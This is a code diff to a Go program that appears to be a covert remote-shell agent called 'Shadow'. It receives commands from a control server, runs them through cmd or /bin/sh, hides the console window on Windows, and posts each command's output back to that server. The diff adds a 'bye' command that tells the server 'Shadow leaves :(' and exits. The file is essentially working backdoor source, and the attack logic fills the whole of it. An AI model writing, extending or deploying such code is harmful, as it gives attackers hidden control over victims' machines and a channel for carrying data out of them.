@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -52,23 +53,29 @@ func main() {
 		//fmt.Println("Go query")
 		//fmt.Println(command)
 
-		osshellargs := []string{"/C", command}
-		if runtime.GOOS == "windows" {
-			osshell = "cmd"
+		if command == "bye" {
+			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {"Shadow leaves :("}})
+			os.Exit(0)
 		} else {
-			osshell = "/bin/sh"
-			osshellargs = []string{"-c", command}
-		}
-		execcmd := exec.Command(osshell, osshellargs...)
-		if runtime.GOOS == "windows" {
-			execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			osshellargs := []string{"/C", command}
+			if runtime.GOOS == "windows" {
+				osshell = "cmd"
+			} else {
+				osshell = "/bin/sh"
+				osshellargs = []string{"-c", command}
+			}
+			execcmd := exec.Command(osshell, osshellargs...)
+			if runtime.GOOS == "windows" {
+				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			}
+
+			out, _ := execcmd.Output()
+			//fmt.Println(string(out))
+			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
+			//client.PostForm(shadowserver, url.Values{"cmd": {command}})
+			time.Sleep(3 * time.Second)
 		}
 
-		out, _ := execcmd.Output()
-		//fmt.Println(string(out))
-		client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
-		//client.PostForm(shadowserver, url.Values{"cmd": {command}})
-		time.Sleep(3 * time.Second)
 	}
 
 }
